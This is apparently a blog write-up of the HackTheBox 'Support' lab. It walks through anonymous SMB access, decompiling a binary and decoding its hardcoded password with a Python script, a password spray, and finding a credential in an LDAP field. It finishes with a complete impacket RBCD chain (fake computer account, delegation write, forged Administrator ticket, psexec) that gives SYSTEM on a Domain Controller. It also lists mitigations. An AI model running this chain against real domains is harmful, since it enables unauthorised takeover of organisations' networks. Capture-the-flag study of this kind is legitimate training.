---
layout: post
title: "HTB Support: From Anonymous SMB to Domain Admin via RBCD"
date: 2026-07-27 09:00:00 +0400
excerpt: "A hardcoded password inside a compiled binary, a plaintext credential hidden in an LDAP notes field, and a full RBCD chain to Domain Admin."
toc:
  - id: intro
    title: The setup
  - id: nmap
    title: Scanning the target
  - id: smb-ldap
    title: Looking for a way in
  - id: foothold
    title: Reverse engineering a tool
  - id: validating
    title: Testing the recovered password
  - id: second-cred
    title: A second password, hidden in plain sight
  - id: winrm
    title: Getting a shell
  - id: rbcd
    title: The privilege escalation
  - id: root
    title: Getting the last flag
  - id: path
    title: The full attack path
  - id: mitigations
    title: How to fix this
  - id: review
    title: My take on this box
---

## The setup {#intro}

**Support** is rated "Easy" on HackTheBox, but don't let that fool you, it packs in a surprising number of core Active Directory attack ideas in one box: an anonymous file share, reverse engineering a compiled tool, a password hidden somewhere nobody thinks to check, and a full delegation-abuse chain to Domain Admin. Here's the entire path, start to finish.

**Difficulty:** Easy · **OS:** Windows Server 2022 · **Domain:** `support.htb`

---

## Scanning the target {#nmap}

Every box starts the same way for me: find out what's actually running before touching anything.

```bash
sudo nmap -p- --min-rate=1000 -T4 -oA allports.txt 10.129.230.181 -v
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

That's the classic Domain Controller port cluster, Kerberos, LDAP, SMB, all present. Confirmed before I touched anything else.

A follow-up scan against the open ports confirmed the domain name, `support.htb`, and that SMB signing was required. Nothing exploitable jumped out from version info alone, but it's a step worth doing anyway.

```bash
sudo nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49676,49681,49701,49739 -oN 02_targeted_ports 10.129.230.181 -v
```

I also ran `enum4linux-ng` to check for anonymous RPC access:

```bash
enum4linux-ng -A -u '' -p '' 10.129.230.181
```

Everything came back `STATUS_ACCESS_DENIED`, no users, no groups, no shares via RPC. Anonymous RPC enumeration was locked down. Worth ruling out, even when it comes back empty.

## Looking for a way in {#smb-ldap}

With RPC closed off, I checked SMB directly instead.

```bash
smbclient -N -L //10.129.230.181/ -users
```

This is where things opened up. One share stood out immediately: `support-tools`, not a default Windows share name.

![smbclient share listing showing the support-tools share](/assets/images/htb-support/image1.png)

```bash
smbclient -N //10.129.230.181/support-tools
```

![Connecting to the support-tools share](/assets/images/htb-support/image2.png)

## Reverse engineering a tool {#foothold}

Inside the share, most files were ordinary portable tools, PuTTY, 7-Zip, Wireshark. One didn't belong: **`UserInfo.exe.zip`**, clearly something custom and internal.

```bash
get UserInfo.exe.zip
```

```bash
sudo unzip UserInfo.exe.zip -d ~/machines/Support/UserInfo_Extracted
```

The config file had nothing useful, just standard .NET runtime settings. So whatever secret existed had to be compiled directly into the binary itself.

```bash
strings UserInfo.exe | grep -i -E "password|user|ldap|connectionstring"
```

That turned up some very telling names: `enc_password`, `getPassword`, `FromBase64String`. Strong signs that a password was stored base64-encoded and decrypted at runtime.

Since the binary targeted .NET Framework 4.8, I installed a matching decompiler and pulled the source apart:

```bash
dotnet tool install --global ilspycmd --version 7.2.1.6856
export PATH="$PATH:$HOME/.dotnet/tools"
ilspycmd UserInfo.exe -o decompiled/
```

The decompiled code laid out the entire scheme:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");

public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    for (int i = 0; i < array.Length; i++)
    {
        array[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDF);
    }
    return Encoding.Default.GetString(array);
}
```

And this line confirmed exactly which account the password belonged to:

```csharp
entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
```

The scheme: base64-decode, then XOR every byte against the ASCII bytes of `"armando"` (repeating as needed), then XOR again against the constant `0xDF`. I rebuilt that logic in Python to get the actual password out:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"

data = base64.b64decode(enc_password)
decrypted = bytearray(data)

for i in range(len(data)):
    decrypted[i] = (data[i] ^ key[i % len(key)]) ^ 0xDF

print(decrypted.decode())
```

![Running the decrypt script](/assets/images/htb-support/image3.png)

![Decrypted password output](/assets/images/htb-support/image4.png)

```
Password is: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Hardcoding a secret in a compiled binary doesn't actually hide it. Decompiling recovers the entire scheme, encoding and all, in a few minutes.

## Testing the recovered password {#validating}

Using the recovered password for enumeration, starting with the user list:

```bash
nxc smb 10.129.62.234 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

Twenty domain users came back. One name, `support`, stood out given the box's name.

![Domain user enumeration showing 20 users](/assets/images/htb-support/image5.png)

I saved them to a list for the next check:

![Users saved to a list](/assets/images/htb-support/image6.png)

Before going further, I checked whether this password was reused anywhere else, always worth ruling out early.

```bash
nxc smb 10.129.62.234 -u users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success
```

![Password spray showing no reuse](/assets/images/htb-support/image7.png)

No reuse. A clean negative result, which just meant the actual path was somewhere else.

I also checked for two classic AD weaknesses, kerberoasting and AS-REP roasting, and kicked off a BloodHound collection at the same time:

```bash
nxc ldap 10.129.62.234 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --kerberoasting kerberoast_output.txt
nxc ldap 10.129.62.234 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --asreproast asrep_output.txt
nxc ldap 10.129.62.234 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --bloodhound -c All --dns-server 10.129.62.234
```

Kerberoasting and AS-REP roasting both came back empty, no vulnerable service accounts, nothing with pre-auth disabled. Legitimate dead ends, not every check has to pay off. The BloodHound collection worked and dropped a set of JSON files to import.

![BloodHound collection completing successfully](/assets/images/htb-support/image8.png)

I moved the output into its own folder and opened BloodHound to import it.

![Collection files moved into a dedicated folder](/assets/images/htb-support/image9.png)

```bash
sudo neo4j console
bloodhound
```

![Uploading the collection into BloodHound](/assets/images/htb-support/image10.png)

I checked what outbound permissions the `ldap` account itself had. Nothing came back.

![BloodHound graph showing no useful outbound permissions](/assets/images/htb-support/image11.png)

A clean dead end from BloodHound's side, time to look somewhere it doesn't check.

## A second password, hidden in plain sight {#second-cred}

Since everything so far had come from LDAP, the obvious next move was a full, unfiltered LDAP dump, every attribute on every object, not just what NXC or BloodHound choose to surface.

```bash
ldapsearch -x -H ldap://10.129.62.234 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" | tee ldap_full_dump.txt
```

```bash
grep -i -E "description|info|comment|userpassword|pwd" ldap_full_dump.txt
```

Buried in the `support` user's object, one line stood out:

```
info: Ironside47pleasure40Watchful
```

![Plaintext password found in the info attribute](/assets/images/htb-support/image12.png)

Here's why this actually worked: BloodHound only pulls attributes relevant to mapping permissions and relationships. It doesn't surface arbitrary free-text fields like `info`, `description`, or `comment`. A raw `ldapsearch` dump returns everything the directory is willing to hand back, no filtering. Someone had stashed a plaintext password in a legacy notes field, betting nobody would look there. Someone did.

```bash
nxc smb 10.129.62.234 -u support -p 'Ironside47pleasure40Watchful'
```

![Confirming the support account credentials](/assets/images/htb-support/image13.png)

## Getting a shell {#winrm}

The same dump showed `support`'s group memberships, including "Remote Management Users," which controls WinRM access. Worth testing right away.

```bash
nxc winrm 10.129.62.234 -u support -p 'Ironside47pleasure40Watchful'
```

![WinRM access confirmed](/assets/images/htb-support/image14.png)

```bash
evil-winrm -i 10.129.62.234 -u support -p 'Ironside47pleasure40Watchful'
```

![Evil-WinRM shell established](/assets/images/htb-support/image15.png)

A quick look around:

```powershell
whoami
whoami /priv
hostname
ipconfig /all
```

```
support\support
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

![Whoami and privilege check results](/assets/images/htb-support/image16.png)

That privilege matters a lot. `SeMachineAccountPrivilege` lets an account add new computer objects to the domain, which is exactly the ingredient needed for a Resource-Based Constrained Delegation attack.

```powershell
type C:\Users\support\Desktop\user.txt
```

![User flag](/assets/images/htb-support/image17.png)

## The privilege escalation {#rbcd}

Back in BloodHound, I checked the "Shared Support Accounts" group instead of the individual user, since `support` is a member of it. This time something showed up: a `GenericAll` edge over `DC.SUPPORT.HTB`, the Domain Controller's own computer object.

![GenericAll over the DC object in BloodHound](/assets/images/htb-support/image18.png)

`GenericAll` means full control over that object. Paired with `SeMachineAccountPrivilege`, this is the exact setup an RBCD attack needs:

1. `GenericAll` on the DC's object lets me configure it to trust a machine account I control
2. `SeMachineAccountPrivilege` lets me create that machine account myself
3. Together, that lets me request a Kerberos ticket impersonating Administrator, entirely through legitimate delegation mechanics, just abused

**Step 1, create a fake computer account:**

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -computer-name 'FAKE01$' -computer-pass 'FakePass123!' -dc-ip 10.129.62.234
```

![Fake computer account created](/assets/images/htb-support/image19.png)

**Step 2, configure delegation:**

```bash
impacket-rbcd -delegate-to 'DC$' -delegate-from 'FAKE01$' -dc-ip 10.129.62.234 -action write support.htb/support:'Ironside47pleasure40Watchful'
```

![Delegation configured successfully](/assets/images/htb-support/image20.png)

**Step 3, request a service ticket impersonating Administrator:**

```bash
impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.62.234 'support.htb/FAKE01$:FakePass123!'
```

![Kerberos ticket saved](/assets/images/htb-support/image21.png)

**Step 4, use the forged ticket:**

`KRB5CCNAME` points Kerberos-aware tools at a specific ticket file, in this case, the forged Administrator ticket.

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

First attempt failed on a DNS lookup, `dc.support.htb` wasn't in `/etc/hosts` yet.

![Error connecting due to missing hosts entry](/assets/images/htb-support/image22.png)

```bash
echo "10.129.62.234 dc.support.htb support.htb" | sudo tee -a /etc/hosts
```

Retried, and this time it went through.

![Retry succeeding after fixing the hosts file](/assets/images/htb-support/image23.png)

```bash
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

![Admin shell obtained via psexec](/assets/images/htb-support/image24.png)

Shell as `NT AUTHORITY\SYSTEM` on the Domain Controller.

![Confirming SYSTEM level access](/assets/images/htb-support/image25.png)

## Getting the last flag {#root}

```powershell
powershell
Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue
```

This recursively searches the entire C: drive for a file named `root.txt`, ignoring folders without read permission (that's what `-ErrorAction SilentlyContinue` does, it suppresses the wall of "Access Denied" errors you'd otherwise get scanning system folders).

![Searching for and locating the root flag path](/assets/images/htb-support/image26.png)

```bash
type C:\Users\Administrator\Desktop\root.txt
```

![Root flag captured](/assets/images/htb-support/image27.png)

Box complete.

---

## The full attack path {#path}

```
Anonymous SMB → support-tools share → UserInfo.exe decompiled
→ hardcoded LDAP password recovered → user enum + password spray (no reuse)
→ kerberoasting/AS-REP roasting (both negative) → full raw LDAP dump
→ second password found in info attribute → WinRM shell as support
→ GenericAll over DC object (via group membership) + SeMachineAccountPrivilege
→ fake computer account → RBCD configured → forged Administrator ticket
→ SYSTEM shell on the DC
```

## How to fix this {#mitigations}

- Never hardcode credentials in application binaries, even encoded ones. Encoding isn't encryption, and any XOR or base64 scheme is trivial to reverse once the binary is decompiled. Secrets belong in a real vault, retrieved at runtime.
- Never store credentials in AD attribute fields like `info`, `description`, or `comment`. Any account with basic directory read access can read these, and they're not designed or audited as secure storage.
- Restrict `GenericAll` and other broad permissions on computer objects, especially the Domain Controller's own object. Audit AD permissions regularly with BloodHound, not just during a pentest.
- Limit `SeMachineAccountPrivilege` to only the accounts that genuinely need to join machines to the domain. By default, every domain user can add up to 10 computer objects, which is usually more than necessary.
- Monitor for changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` on sensitive computer objects, especially DCs, since that's the exact setting RBCD abuses.

## My take on this box {#review}

This is genuinely one of the better "Easy"-rated AD boxes for building well-rounded methodology. It doesn't rely on one flashy exploit, it chains together SMB enumeration, reverse engineering a real binary, a manual LDAP deep-dive that goes beyond BloodHound, and a real RBCD escalation. The biggest lesson for me: BloodHound is not a replacement for manual enumeration. It's built specifically for mapping relationships and permissions, and it deliberately skips free-text fields like `info`. Pairing automated tooling with a full manual LDAP dump is what actually surfaced the second credential here.
